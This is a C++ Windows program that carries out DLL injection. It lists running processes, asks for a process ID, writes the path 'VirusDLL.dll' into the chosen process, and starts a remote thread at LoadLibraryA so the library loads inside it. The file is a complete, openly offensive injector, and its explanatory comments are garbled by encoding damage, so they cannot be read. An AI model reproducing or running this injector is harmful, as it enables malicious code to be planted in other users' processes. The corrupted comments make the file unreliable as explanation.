#include<stdio.h>
#include<windows.h>
#include<tlhelp32.h>
#include<iostream>
#include<tchar.h>
using namespace std;
bool WriteMemory(const HANDLE hProcess, const DWORD dwSize, const LPVOID lpRemoteBuf, const LPVOID Data)
{
	DWORD dwNumberOfBytesWritten;
	if (lpRemoteBuf == NULL)//lpRemoteBuf��ʾһ��ָ��Ŀ����̵�ַ�ռ�Ļ�����
	{
		return false;//���lpRemoteBuf����NULL��ʾ��Ŀ����̵�ַ�ռ������ڴ�ʧ����
	}
	if (WriteProcessMemory(hProcess, lpRemoteBuf, Data, dwSize, &dwNumberOfBytesWritten))//��������ڴ�û��ʧ������Ŀ����̵Ļ�����д������
	{
		if (dwSize != dwNumberOfBytesWritten)//dwSize��Ҫд������ݴ�С,dwNumberOfBytesWritten��ʵ��д������ݴ�С
		{
			//���dwSize������dwNumberOfBytesWritten���ʾ����д�벻����,ͬ����ʧ�ܸ���
			VirtualFreeEx(hProcess, lpRemoteBuf, dwSize, MEM_DECOMMIT);
			CloseHandle(hProcess);
			return false;
		}
	}
	else
	{
		CloseHandle(hProcess);
		return false;
	}
	return true;
}
bool ProcessInjection(const unsigned int ProcessID)
{
	//OpenProcess��һ������ָ��Ҫ�Ըý��̽��еĲ���(Ҳ����Ȩ��)
	//PROCESS_CREATE_THREAD��ʾ������Ŀ������д���Զ���̣߳�Ҳ����ʹ��CreateRemoteThread��Ȩ�ޣ�
	//PROCESS_VM_OPERATION��ʾ������Ŀ������з���/�ͷ��ڴ��Ȩ�ޣ�Ҳ����ʹ�� VirtualAllocEx/VirtualFreeEx��Ȩ�ޣ�
	//PROCESS_VM_WRITE��ʾ������Ŀ����̵ĵ�ַ�ռ�д�����ݣ�Ҳ����ʹ�� WriteProcessMemory��Ȩ�ޡ�
	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, ProcessID);
	LPCTSTR Data = _T("VirusDLL.dll");
	DWORD dwSize;
	dwSize = _tcslen(Data) + 1;//����Ҫ��Ŀ�������������ڴ��С
	LPVOID lpRemoteBuf = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);//��Ŀ������������ڴ�

																							//������ǵ����������ǸղŴ����дĿ����̵�ַ�ռ�ĺ���,Ϊ�˳���Ľṹ���������԰��ⲿ�ֵ�����װ��һ������;
	if (!WriteMemory(hProcess, dwSize, lpRemoteBuf, (LPVOID)Data)) return false;

	DWORD dwRemoteThreadHandle;
	//�����б�Ҫ˵��һдlpRemoteEntryFun��һ��LPVOIDָ��,ָ��LoadLibraryA����,����������ȡ��LoadLibraryA������ַ
	//����Ա����̶��Եĺ�����ַ,����Ŀ����̶���LoadLibraryA�ĺ�����ַ���ܺ��ҵĲ�һ��;
	//��������ǶԵ�,���Ƕ�����Щ������˵,Ҳ����ȫ��ȷ,��ΪLoadLibraryAλ��kernel32.dll֮��;
	//��Win32��ÿ��Ӧ�ó��򶼻��kernel32.dll���ص����̵�ַ�ռ���һ���̶��ĵ�ַ��;
	//����������LoadLibraryA������ַ��ÿ��Ӧ�ó����еĵ�ַ��һ����;
	LPVOID lpRemoteEntryFun = LoadLibraryA;
	//���������Ǵ���һ��Զ���߳�,�̵߳���ں�����LoadLibraryA,�������������Ѿ�д��Ŀ����̵�ַ�ռ��DLL����
	HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpRemoteEntryFun, lpRemoteBuf, 0, &dwRemoteThreadHandle);
	WaitForSingleObject(hRemoteThread, INFINITE);//�ȴ�LoadLibraryAִ�����
	CloseHandle(hRemoteThread);
	CloseHandle(hProcess);
	cout << "DLL�Ѿ��ɹ�ע��!" << endl;
	return true;
}

int main()
{
	unsigned int ProcessID;
	PROCESSENTRY32 stPE32;
	stPE32.dwSize = sizeof(stPE32);
	HANDLE hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	bool bMore = (bool)Process32First(hSnapshot, &stPE32);
	while (bMore)
	{
		cout << stPE32.szExeFile << " \t " << stPE32.th32ProcessID << endl;
		bMore = (bool)Process32Next(hSnapshot, &stPE32);
	}
	//�ڴ����ǿ���ѡ��һ��Ҫע��Ľ���ID
	cout << "������Ҫע��Ľ���ID:";
	cin >> ProcessID;
	ProcessInjection(ProcessID);

	return 0;
}

